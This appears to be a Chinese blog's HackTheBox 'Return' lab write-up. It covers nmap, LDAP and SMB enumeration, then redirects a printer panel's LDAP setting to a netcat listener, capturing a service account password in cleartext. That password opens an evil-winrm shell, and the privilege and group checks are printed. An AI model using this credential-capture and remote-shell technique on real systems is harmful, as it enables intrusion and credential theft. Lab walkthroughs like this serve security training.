@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="nmap1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950PORT      STATE SERVICE       VERSION53&#x2F;tcp    open  domain        Simple DNS Plus80&#x2F;tcp    open  http">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox——Tracks AD Return">
+<meta property="og:url" content="https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/index.html">
+<meta property="og:site_name" content="N0nome&#96;s Fucking Life">
+<meta property="og:description" content="nmap1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950PORT      STATE SERVICE       VERSION53&#x2F;tcp    open  domain        Simple DNS Plus80&#x2F;tcp    open  http">
+<meta property="og:locale">
+<meta property="og:image" content="https://n0nome.github.io/images/return.png">
+<meta property="og:image" content="https://n0nome.github.io/images/return-1.png">
+<meta property="og:image" content="https://n0nome.github.io/images/return-2.png">
+<meta property="og:image" content="https://n0nome.github.io/images/return-3.png">
+<meta property="og:image" content="https://n0nome.github.io/images/return-4.png">
+<meta property="article:published_time" content="2025-04-30T02:55:29.341Z">
+<meta property="article:modified_time" content="2025-04-30T02:55:29.593Z">
+<meta property="article:author" content="n0nome">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0nome.github.io/images/return.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/1c0ccb80f18de6871d3fd37b97cd3594?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/1c0ccb80f18de6871d3fd37b97cd3594?s=192" sizes="192x192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/1c0ccb80f18de6871d3fd37b97cd3594?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox——Tracks AD Return</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+  
+  <link rel="stylesheet" href="/css/custom.css">
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="N0nome`s Fucking Life" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/random/">random_thoughts</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/28/Eureka/Eureka/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&text=HackTheBox——Tracks AD Return"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&title=HackTheBox——Tracks AD Return"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&is_video=false&description=HackTheBox——Tracks AD Return"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox——Tracks AD Return&body=Check out this article: https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&title=HackTheBox——Tracks AD Return"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&title=HackTheBox——Tracks AD Return"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&title=HackTheBox——Tracks AD Return"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&title=HackTheBox——Tracks AD Return"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&name=HackTheBox——Tracks AD Return&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/04/30/Return/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Return/&t=HackTheBox——Tracks AD Return"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-ldap"><span class="toc-number">1.1.</span> <span class="toc-text">smb&#x2F;ldap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#printer-return-local"><span class="toc-number">1.2.</span> <span class="toc-text">printer.return.local</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-svc-printer"><span class="toc-number">2.</span> <span class="toc-text">shell as svc-printer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashes"><span class="toc-number">3.</span> <span class="toc-text">Hashes</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  
+
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox——Tracks AD Return
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">
+          
+            n0nome
+          
+        </span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-30T02:55:29.341Z" class="dt-published" itemprop="datePublished">2025-04-30</time>
+        
+        (Updated: <time datetime="2025-04-30T02:55:29.593Z" class="dt-updated" itemprop="dateModified">2025-04-30</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+
+  
+
+
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><a data-fancybox="gallery" data-src="/images/return.png" data-caption=""><img src="/images/return.png"></a></p>
+<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>80/tcp    open  http          Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE      <br>|_http-title: HTB Printer Admin Panel<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server <span class="hljs-keyword">time</span>: 2025-04-30 01:47:09Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?                                                                    <br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  tcpwrapped<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)<br>3269/tcp  open  tcpwrapped<br>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>9389/tcp  open  mc-nmf        .NET Message Framing<br>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-title: Not Found<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>49664/tcp open  msrpc         Microsoft Windows RPC<br>49665/tcp open  msrpc         Microsoft Windows RPC<br>49666/tcp open  msrpc         Microsoft Windows RPC<br>49667/tcp open  msrpc         Microsoft Windows RPC<br>49671/tcp open  msrpc         Microsoft Windows RPC<br>49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>49675/tcp open  msrpc         Microsoft Windows RPC<br>49677/tcp open  msrpc         Microsoft Windows RPC<br>49680/tcp open  msrpc         Microsoft Windows RPC<br>49698/tcp open  msrpc         Microsoft Windows RPC<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%<br>), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows 10 1903 (92%), Windows Server 2019 (92%), Microsoft Windows Vista SP1 (92%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: 18m34s<br>| smb2-security-mode: <br>|   3:1:1: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2025-04-30T01:48:14<br>|_  start_date: N/A<br><br></code></pre></td></tr></table></figure>
+<p>先把<code>return.local</code>加到hosts里面</p>
+<h3 id="smb-ldap"><a href="#smb-ldap" class="headerlink" title="smb&#x2F;ldap"></a>smb&#x2F;ldap</h3><p>smb不能guest和anonymous<br>ldap倒是有一点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ldapsearch -H <span class="hljs-string">&#x27;ldap://10.129.49.187&#x27;</span> -x -s base                <br>。。。       <br>dn:                                                                                              <br>domainFunctionality: 7                  <br>forestFunctionality: 7                                                                           <br>domainControllerFunctionality: 7        <br>rootDomainNamingContext: DC=<span class="hljs-built_in">return</span>,DC=<span class="hljs-built_in">local</span>                                                      <br>ldapServiceName: return.local:printer<span class="hljs-variable">$@RETURN</span>.LOCAL                                              <br>isGlobalCatalogReady: TRUE                                                                       <br>supportedSASLMechanisms: GSSAPI                                                                  <br>supportedSASLMechanisms: GSS-SPNEGO      <br>。。。<br>subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=<span class="hljs-built_in">return</span>,DC=<span class="hljs-built_in">local</span><br>serverName: CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Confi<br> guration,DC=<span class="hljs-built_in">return</span>,DC=<span class="hljs-built_in">local</span><br>schemaNamingContext: CN=Schema,CN=Configuration,DC=<span class="hljs-built_in">return</span>,DC=<span class="hljs-built_in">local</span><br>namingContexts: DC=<span class="hljs-built_in">return</span>,DC=<span class="hljs-built_in">local</span><br>namingContexts: CN=Configuration,DC=<span class="hljs-built_in">return</span>,DC=<span class="hljs-built_in">local</span><br>namingContexts: CN=Schema,CN=Configuration,DC=<span class="hljs-built_in">return</span>,DC=<span class="hljs-built_in">local</span><br>namingContexts: DC=DomainDnsZones,DC=<span class="hljs-built_in">return</span>,DC=<span class="hljs-built_in">local</span><br>namingContexts: DC=ForestDnsZones,DC=<span class="hljs-built_in">return</span>,DC=<span class="hljs-built_in">local</span><br>isSynchronized: TRUE<br>highestCommittedUSN: 110694<br>dsServiceName: CN=NTDS Settings,CN=PRINTER,CN=Servers,CN=Default-First-Site-Na<br> me,CN=Sites,CN=Configuration,DC=<span class="hljs-built_in">return</span>,DC=<span class="hljs-built_in">local</span><br>dnsHostName: printer.return.local<br>defaultNamingContext: DC=<span class="hljs-built_in">return</span>,DC=<span class="hljs-built_in">local</span><br>currentTime: 20250430015221.0Z<br>configurationNamingContext: CN=Configuration,DC=<span class="hljs-built_in">return</span>,DC=<span class="hljs-built_in">local</span><br><br><span class="hljs-comment"># search result</span><br>search: 2<br>result: 0 Success<br><br></code></pre></td></tr></table></figure>
+<p>把<code>printer.return.local</code>也加到hosts里面，在web上看一下</p>
+<h3 id="printer-return-local"><a href="#printer-return-local" class="headerlink" title="printer.return.local"></a>printer.return.local</h3><p><a data-fancybox="gallery" data-src="/images/return-1.png" data-caption=""><img src="/images/return-1.png"></a><br><a data-fancybox="gallery" data-src="/images/return-2.png" data-caption=""><img src="/images/return-2.png"></a><br>settings.php改了一下发现没啥反应，先爆破一下目录，顺带上一下burp<br><a data-fancybox="gallery" data-src="/images/return-3.png" data-caption=""><img src="/images/return-3.png"></a><br>他也只向server提交了IP，别的没看出啥变化来<br>接着枚举一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 /home/wansh/Downloads/enum4linux-ng/enum4linux-ng.py -A 10.129.49.187<br> ==========================  <br>|    Target Information    |                                                                     <br> ==========================                                                                      <br>[*] Target ........... 10.129.49.187                                                             <br>[*] Username ......... <span class="hljs-string">&#x27;&#x27;</span> <br>[*] Random Username .. <span class="hljs-string">&#x27;uomvfqhs&#x27;</span>          <br>[*] Password ......... <span class="hljs-string">&#x27;&#x27;</span>                   <br>[*] Timeout .......... 5 second(s)              <br>                                                                                                 <br> ======================================                                                          <br>|    Listener Scan on 10.129.49.187    |                                                         <br> ======================================                                                          <br>[*] Checking LDAP                                                                                <br>[+] LDAP is accessible on 389/tcp      <br>[*] Checking LDAPS<br>[+] LDAPS is accessible on 636/tcp<br>[*] Checking SMB<br>[+] SMB is accessible on 445/tcp<br>[*] Checking SMB over NetBIOS<br>[+] SMB over NetBIOS is accessible on 139/tcp<br><br> =====================================================<br>|    Domain Information via LDAP <span class="hljs-keyword">for</span> 10.129.49.187    |<br> =====================================================<br>[*] Trying LDAP<br>[+] Appears to be root/parent DC<br>[+] Long domain name is: return.local<br> ==========================================<br>|    SMB Dialect Check on 10.129.49.187    |<br> ==========================================<br>[*] Trying on 445/tcp<br>[+] Supported dialects and settings:<br>Supported dialects:<br>  SMB 1.0: <span class="hljs-literal">false</span><br>  SMB 2.02: <span class="hljs-literal">true</span><br>  SMB 2.1: <span class="hljs-literal">true</span><br>  SMB 3.0: <span class="hljs-literal">true</span><br>  SMB 3.1.1: <span class="hljs-literal">true</span><br>Preferred dialect: SMB 3.0<br>SMB1 only: <span class="hljs-literal">false</span><br>SMB signing required: <span class="hljs-literal">true</span><br><br> ============================================================<br>|    Domain Information via SMB session <span class="hljs-keyword">for</span> 10.129.49.187    |<br> ============================================================<br>[*] Enumerating via unauthenticated SMB session on 445/tcp<br>[+] Found domain information via SMB<br>NetBIOS computer name: PRINTER<br>NetBIOS domain name: RETURN<br>DNS domain: return.local<br>FQDN: printer.return.local<br>Derived membership: domain member<br>Derived domain: RETURN<br>==========================================<br>|    RPC Session Check on 10.129.49.187    |<br> ==========================================<br>[*] Check <span class="hljs-keyword">for</span> null session<br>[+] Server allows session using username <span class="hljs-string">&#x27;&#x27;</span>, password <span class="hljs-string">&#x27;&#x27;</span><br> ====================================================<br>|    Domain Information via RPC <span class="hljs-keyword">for</span> 10.129.49.187    |<br> ====================================================<br>[+] Domain: RETURN<br>[+] Domain SID: S-1-5-21-3750359090-2939318659-876128439<br>[+] Membership: domain member<br> ================================================<br>|    OS Information via RPC <span class="hljs-keyword">for</span> 10.129.49.187    |<br> ================================================<br>[*] Enumerating via unauthenticated SMB session on 445/tcp<br>[+] Found OS information via SMB<br>[+] After merging OS information we have the following result:<br>OS: Windows 10, Windows Server 2019, Windows Server 2016<br>OS version: <span class="hljs-string">&#x27;10.0&#x27;</span><br>OS release: <span class="hljs-string">&#x27;1809&#x27;</span><br>OS build: <span class="hljs-string">&#x27;17763&#x27;</span><br>Native OS: not supported<br>Native LAN manager: not supported<br>Platform <span class="hljs-built_in">id</span>: null<br>Server <span class="hljs-built_in">type</span>: null<br>Server <span class="hljs-built_in">type</span> string: null<br></code></pre></td></tr></table></figure>
+<p>只有domain sid，其他的也没有利用点，还是回归settings.php<br>他返回只返回IP，那就只改IP，在本地监听389端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> rlwrap -cAr nc -lvnp 389<br>[<span class="hljs-built_in">sudo</span>] wansh 的密码：<br>Listening on 0.0.0.0 389<br>Connection received on 10.129.49.187 54950<br>0*`%<span class="hljs-built_in">return</span>\svc-printer<br>0*`%<span class="hljs-built_in">return</span>\svc-printer<br>                      1edFg43012!!<br><br></code></pre></td></tr></table></figure>
+<p>返回了一个密码。。。<br>直接尝试evil-winrm登录<br><code>中间修了一下evil-winrm</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">sudo</span> evil-winrm -i 10.129.49.187 -u svc-printer -p <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span><br>/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining <span class="hljs-string">&#x27;object_id&#x27;</span> may cause serious problems<br>/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining <span class="hljs-string">&#x27;object_id&#x27;</span> may cause serious problems<br>                                        <br>Evil-WinRM shell v3.7<br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="hljs-string">&#x27;quoting_detection_proc&#x27;</span> <span class="hljs-keyword">for</span> module Reline<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion<br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; <br><br></code></pre></td></tr></table></figure>
+<h2 id="shell-as-svc-printer"><a href="#shell-as-svc-printer" class="headerlink" title="shell as svc-printer"></a>shell as svc-printer</h2><p>看下权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; <span class="hljs-built_in">whoami</span> /priv<br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                         State<br>============================= =================================== =======<br>SeMachineAccountPrivilege     Add workstations to domain          Enabled<br>SeLoadDriverPrivilege         Load and unload device drivers      Enabled<br>SeSystemtimePrivilege         Change the system <span class="hljs-keyword">time</span>              Enabled<br>SeBackupPrivilege             Back up files and directories       Enabled<br>SeRestorePrivilege            Restore files and directories       Enabled<br>SeShutdownPrivilege           Shut down the system                Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking            Enabled<br>SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span>      Enabled<br>SeTimeZonePrivilege           Change the <span class="hljs-keyword">time</span> zone                Enabled<br><br></code></pre></td></tr></table></figure>
+<p>其中给的权限很多，不过先枚举一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\svc-printer\desktop&gt; net user svc-printer<br>User name                    svc-printer<br>Full Name                    SVCPrinter<br>Comment                      Service Account <span class="hljs-keyword">for</span> Printer<br>User<span class="hljs-string">&#x27;s comment</span><br><span class="hljs-string">Country/region code          000 (System Default)</span><br><span class="hljs-string">Account active               Yes</span><br><span class="hljs-string">Account expires              Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password last set            5/26/2021 1:15:13 AM</span><br><span class="hljs-string">Password expires             Never</span><br><span class="hljs-string">Password changeable          5/27/2021 1:15:13 AM</span><br><span class="hljs-string">Password required            Yes</span><br><span class="hljs-string">User may change password     Yes</span><br><span class="hljs-string"></span><br><span class="hljs-string">Workstations allowed         All</span><br><span class="hljs-string">Logon script</span><br><span class="hljs-string">User profile</span><br><span class="hljs-string">Home directory</span><br><span class="hljs-string">Last logon                   5/26/2021 1:39:29 AM</span><br><span class="hljs-string"></span><br><span class="hljs-string">Logon hours allowed          All</span><br><span class="hljs-string"></span><br><span class="hljs-string">Local Group Memberships      *Print Operators      *Remote Management Use</span><br><span class="hljs-string">                             *Server Operators</span><br><span class="hljs-string">Global Group memberships     *Domain Users</span><br><span class="hljs-string">The command completed successfully.</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+<p>这里可以看到svc-printer是<code>Server Operators</code>组的成员，也是<code>Print Operators</code>组的成员，分别看下两个组都还有哪些</p>
